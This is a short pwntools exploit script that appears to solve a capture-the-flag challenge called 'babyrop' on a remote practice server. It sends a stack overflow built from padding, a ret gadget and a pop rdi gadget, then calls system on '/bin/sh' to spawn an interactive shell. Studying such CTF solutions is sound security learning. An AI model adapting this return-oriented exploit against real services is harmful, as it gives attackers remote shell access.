from pwn import *

context.log_level = "debug"

exe = ELF("./babyrop")
# r = exe.process()
r = remote("node4.buuoj.cn", 27129)

# 0x0000000000400683 : pop rdi ; ret
# 0x0000000000400479 : ret
pop_rdi = p64(0x400683)
ret = p64(0x400479)

r.recvuntil(b"? ")
r.sendline(cyclic(24) + ret + pop_rdi + p64(exe.sym["binsh"]) + p64(exe.plt["system"]))
r.interactive()
